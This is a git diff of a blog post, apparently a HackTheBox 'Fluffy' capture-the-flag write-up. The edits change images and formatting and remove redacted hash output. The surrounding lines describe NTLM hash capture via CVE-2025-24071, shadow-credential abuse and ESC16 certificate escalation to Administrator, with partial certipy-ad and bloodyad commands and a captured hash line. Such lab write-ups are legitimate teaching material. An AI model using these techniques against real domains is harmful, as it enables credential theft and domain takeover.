@@ -5,8 +5,8 @@ categories: [HackTheBox, Active Directory]
 tags: [htb, active-directory, cve-2025-24071, shadow-credentials, esc16, ad-cs, certipy, bloodhound, bloodyad, windows]
 classes: wide
 header:
-  image: /assets/images/fluffy-banner.png
-  teaser: /assets/images/fluffy-banner.png
+  image: /assets/images/fluffy.png
+  teaser: /assets/images/fluffy.png
 ---
 
 # HTB Fluffy
@@ -101,15 +101,14 @@ One of them is **CVE-2025-24071**.
 The box just handed us our attack vector.
 
 ---
-
+![update](/assets/images/update_notice.png)
 ## Initial Access — CVE-2025-24071
 
 ### What This CVE Actually Does
 
 CVE-2025-24071 is a Windows File Explorer spoofing vulnerability.  
 When a user extracts a ZIP that contains a malicious `.library-ms` file,  
-Windows automatically resolves the network path embedded in that file —  
-and sends an NTLMv2 authentication request to the attacker's IP in the process.
+Windows automatically resolves the network path embedded in that file and sends an NTLMv2 authentication request to the attacker's IP in the process.
 
 No clicks beyond extracting the ZIP. No user interaction.  
 The hash comes to whoever's listening.
@@ -147,7 +146,7 @@ smbclient //10.129.232.88/IT \
 ```
 
 Wait. Responder delivers:
-
+![Responder](/assets/images/resp.png)
 ```
 [SMB] NTLMv2-SSP Username : FLUFFY\p.agila
 [SMB] NTLMv2-SSP Hash     : p.agila::FLUFFY:4f692ad3d16de6e5:3849CA3E874C35F9...
@@ -208,7 +207,7 @@ bloodyad -u 'p.agila' -p '[REDACTED]' -d fluffy.htb \
 
 ---
 
-### Shadow Credentials — What It Is
+### Shadow Credentials —> What It Is
 
 Shadow Credentials abuses the `msDS-KeyCredentialLink` attribute.  
 If you have GenericWrite over an account, you can add a temporary  
@@ -223,10 +222,9 @@ faketime '2026-06-22 18:05:00' certipy-ad shadow auto \
   -password '[REDACTED]' \
   -account winrm_svc
 ```
+![winrm](/assets/images/winrm.png)
 
-```
-NT hash for 'winrm_svc': [REDACTED]
-```
+
 
 ---
 
@@ -258,10 +256,8 @@ faketime '2026-06-22 18:09:00' certipy-ad shadow auto \
   -password '[REDACTED]' \
   -account ca_svc
 ```
+![Ca_svc](/assets/images/ca.png)
 
-```
-NT hash for 'ca_svc': [REDACTED]
-```
 
 ---
 
@@ -287,7 +283,7 @@ and the DC will treat that cert as belonging to Administrator.
 ### ESC16 Exploitation
 
 **Step 1 — Swap ca_svc's UPN:**
-
+![upn](/assets/images/upn.png)
 ```bash
 faketime '2026-06-22 18:10:00' certipy-ad account update \
   -username "p.agila@fluffy.htb" \
@@ -345,7 +341,7 @@ UPN restored. Cert auth now works from Kali.
 ---
 
 ### Get Administrator Hash
-
+![ADMINISTRATOR](/assets/images/admin.png)
 ```bash
 faketime '2026-06-22 18:45:00' certipy auth -pfx administrator.pfx \
   -domain fluffy.htb \
@@ -410,7 +406,7 @@ Windows sends the NTLM request automatically — the hash comes to you.
 Any writable share an internal user touches is a potential hash capture point.
 
 **2. BloodHound is non-negotiable**  
-The GenericAll → GenericWrite → Shadow Credentials chain is invisible  
+The GenericAll -> GenericWrite -> Shadow Credentials chain is invisible  
 without graph enumeration. Manual LDAP queries would've taken hours.  
 Always run BloodHound once you have any valid credential in an AD environment.
 
@@ -420,8 +416,7 @@ No password policy concerns, no wordlist dependency.
 If you have write primitives on an AD account, check for this first.
 
 **4. ESC16 is a CA configuration issue, not a template issue**  
-The vulnerability isn't in what the template allows —  
-it's in the CA not embedding SIDs, which kills the DC's ability  
+The vulnerability isn't in what the template allows rather it's in the CA not embedding SIDs, which kills the DC's ability  
 to verify cert-to-account binding. Common in environments that  
 have tuned the CA for compatibility without understanding the security implications.
 
@@ -433,9 +428,10 @@ you're trying to solve externally. Use what you've already got.
 **6. Decoys are real**  
 Everything and KeePass on the share were noise.  
 The only thing that mattered was the PDF pointing at a CVE worth exploiting.  
-On real engagements, shares are full of irrelevant data —  
-train yourself to look for what points somewhere, not just what looks interesting.
+On real engagements, shares are full of irrelevant data so train yourself to look for what points somewhere, not just what looks interesting.
 
+
+PS:I almost tried kerberoasting winrm and ca_svc...didn't work. Kerberoastable doesn't mean you get the password.
 ---
 
 <img src="https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExcG1xYmNsYmVsc3NtMXAxdnVnYjQ0NWVydzBycHlwbmM2ZW5hd3BjbSZlcD12MV9naWZzX3NlYXJjaCZjdD1n/MT5UUV1d4CXE2A37Dg/giphy.gif"
